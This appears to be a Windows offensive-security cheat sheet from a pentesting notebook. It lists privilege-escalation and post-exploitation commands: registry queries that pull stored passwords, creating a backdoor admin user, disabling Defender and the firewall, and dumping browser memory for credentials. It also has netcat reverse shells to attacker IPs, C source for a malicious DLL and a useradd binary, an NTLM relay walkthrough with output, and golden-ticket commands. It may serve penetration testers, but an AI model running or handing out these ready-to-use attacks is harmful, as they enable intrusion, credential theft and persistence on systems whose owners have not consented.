# Windows

\*\*Tools\*\*

https://github.com/S3cur3Th1sSh1t/WinPwn

https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASbat/winPEAS.bat

https://github.com/BC-SECURITY/Empire/blob/master/data/module\_source/privesc/PowerUp.ps1

https://github.com/S3cur3Th1sSh1t/PowerSharpPack

https://github.com/Flangvik/SharpCollection

https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1

https://github.com/dafthack/DomainPasswordSpray

https://github.com/CredDefense/CredDefense

https://github.com/dafthack/MailSniper

​

https://lolbas-project.github.io/\#

​

\# Basic info

systeminfo

set

Get-ChildItem Env: \| ft Key,Value

hostname

net users

net user user1

query user

Get-LocalUser \| ft Name,Enabled,LastLogon

Get-ChildItem C:\Users -Force \| select Name

net use

wmic logicaldisk get caption,description,providername

Get-PSDrive \| where {$\_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}\| ft Name,Root

net localgroups

accesschk.exe -uwcqv "Authenticated Users" \*

netsh firewall show state

netsh firewall show config

whoami /priv

echo %USERNAME%

$env:UserName

wmic qfe

qwinsta

query user

net localgroup

Get-LocalGroup \| ft Name

​

\# Set path

set PATH=%PATH%;C:\xampp\php

​

dir /a -&gt; Show hidden & unhidden files

dir /Q -&gt; Show permissions

​

\# check .net version:

gci 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -recurse \| gp -name Version -EA 0 \| where { $\_.PSChildName -match '^\(?!S\)\p{L}'} \| select PSChildName, Version

get-acl HKLM:\System\CurrentControlSet\services\\* \| Format-List \* \| findstr /i "Users Path"

​

\# Passwords

\# Windows autologin

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

\# VNC

reg query "HKCU\Software\ORL\WinVNC3\Password"

\# SNMP Parameters

reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

\# Putty

reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

\# Search for password in registry

reg query HKLM /f password /t REG\_SZ /s

reg query HKCU /f password /t REG\_SZ /s

​

\# Add RDP user and disable firewall

net user haxxor Haxxor123 /add

net localgroup Administrators haxxor /add

net localgroup "Remote Desktop Users" haxxor /ADD

\# Turn firewall off and enable RDP

sc stop WinDefend

netsh advfirewall show allprofiles

netsh advfirewall set allprofiles state off

netsh firewall set opmode disable

reg add "HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG\_DWORD /d 0 /f

reg add "HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG\_DWORD /d 0 /f

​

\# Dump Firefox data

\# Looking for Firefox

Get-Process

./procdump64.exe -ma $PID-FF

Select-String -Path .\\*.dmp -Pattern 'password' &gt; 1.txt

type 1.txt \| findstr /s /i "admin"

​

\# PS Bypass Policy

Set-ExecutionPolicy Unrestricted

powershell.exe -exec bypass

Set-ExecutionPolicy-ExecutionPolicyBypass -Scope Procesy

​

\# Convert passwords to secure strings and output to an XML file:

$secpasswd = ConvertTo-SecureString "VMware1!" -AsPlainText -Force

$mycreds = New-Object System.Management.Automation.PSCredential \("administrator", $secpasswd\)

$mycreds \| export-clixml -path c:\temp\password.xml

​

\# PS sudo

$pw= convertto-securestring "EnterPasswordHere" -asplaintext -force

$pp = new-object -typename System.Management.Automation.PSCredential -argumentlist "EnterDomainName\EnterUserName",$pw

$script = "C:\Users\EnterUserName\AppData\Local\Temp\test.bat"

Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{Start-Process $script -verb Runas}'

powershell -ExecutionPolicy -F -File xyz.ps1

​

\# PS runas

\# START PROCESS

$username='someUser'

$password='somePassword'

$securePassword = ConvertTo-SecureString $password -AsPlainText -Force

$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

Start-Process .\nc.exe -ArgumentList '10.10.xx.xx 4445 -e cmd.exe' -Credential $credential

\# INVOKE COMMAND

$pass = ConvertTo-SecureString 'l33th4x0rhector' -AsPlainText -Force; $Credential = New-Object System.Management.Automation.PSCredential \("fidelity\hector", $pass\);Invoke-Command -Computer 'Fidelity' -ScriptBlock {C:\inetpub\wwwroot\uploads\nc.exe -e cmd 10.10.15.121 443} -credential $Credential

​

\# Tasks

schtasks /query /fo LIST /v

file c:\WINDOWS\SchedLgU.Txt

​

\# Useradd bin

\#include /\* system, NULL, EXIT\_FAILURE \*/

int main \(\)

{

 int i;

 i=system \("net user /add && net localgroup administrators /add"\);

 return 0;

}

\# Compile

i686-w64-mingw32-gcc -o useradd.exe useradd.c

​

\# WinXP

sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe 10.11.1.111 4343 -e C:\WINDOWS\System32\cmd.exe"

sc config upnphost obj= ".\LocalSystem" password= ""

sc qc upnphost

sc config upnphost depend= ""

net start upnphost

​

\# WinRM Port Forwarding

plink -l LOCALUSER -pw LOCALPASSWORD LOCALIP -R 5985:127.0.0.1:5985 -P 221

​

\# DLL Injection

\#include

int owned\(\)

{

 WinExec\("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0\);

 exit\(0\);

 return 0;

}

BOOL WINAPI DllMain\(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved\)

{

 owned\(\);

 return 0;

}

\# x64 compilation:

x86\_64-w64-mingw32-g++ -c -DBUILDING\_EXAMPLE\_DLL main.cpp

x86\_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

​

\# NTLM Relay Attack

We need two tools to perform the attack, privexchange.py and ntlmrelayx. You can get both on GitHub in the PrivExchange and impacket repositories. Start ntlmrelayx in relay mode with LDAP on a Domain Controller as target, and supply a user under the attackers control to escalate privileges with \(in this case the ntu user\):

​

ntlmrelayx.py -t ldap://s2016dc.testsegment.local --escalate-user ntu

​

Now we run the privexchange.py script:

​

[\[email protected\]](https://six2dez.gitbook.io/cdn-cgi/l/email-protection):~/exchpoc$ python privexchange.py -ah dev.testsegment.local s2012exc.testsegment.local -u ntu -d testsegment.local

​

Password:

INFO: Using attacker URL: http://dev.testsegment.local/privexchange/

INFO: Exchange returned HTTP status 200 - authentication was OK

ERROR: The user you authenticated with does not have a mailbox associated. Try a different user.

When this is run with a user which doesn’t have a mailbox, we will get the above error. Let’s try it again with a user which does have a mailbox associated:

​

[\[email protected\]](https://six2dez.gitbook.io/cdn-cgi/l/email-protection):~/exchpoc$ python privexchange.py -ah dev.testsegment.local s2012exc.testsegment.local -u testuser -d testsegment.local

Password:

INFO: Using attacker URL: http://dev.testsegment.local/privexchange/

INFO: Exchange returned HTTP status 200 - authentication was OK

INFO: API call was successful

​

After a minute \(which is the value supplied for the push notification\) we see the connection coming in at ntlmrelayx, which gives our user DCSync privileges:

 We confirm the DCSync rights are in place with secretsdump:

With all the hashed password of all Active Directory users, the attacker can create golden tickets to impersonate any user, or use any users password hash to authenticate to any service accepting NTLM or Kerberos authentication in the domain.

​

\# Generate Silver Tickets with Impacket:

python3 ticketer.py -nthash -domain-sid -domain -spn

python3 ticketer.py -aesKey -domain-sid -domain -spn

​

\# Generate Golden Tickets:

python3 ticketer.py -nthash -domain-sid -domain

python3 ticketer.py -aesKey -domain-sid -domain

​

\# Credential Access with Secretsdump

​

\# Disable Assembly code generator

https://amsi.fail/

​

https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/?view=powershell-6

https://powersploit.readthedocs.io/en/latest/

https://hackertarget.com/nmap-cheatsheet-a-quick-reference-guide/

https://techcommunity.microsoft.com/t5/itops-talk-blog/powershell-basics-how-to-scan-open-ports-within-a-network/ba-p/924149

https://pen-testing.sans.org/blog/2017/03/08/pen-test-poster-white-board-powershell-built-in-port-scanner/

https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1

https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Portscan/

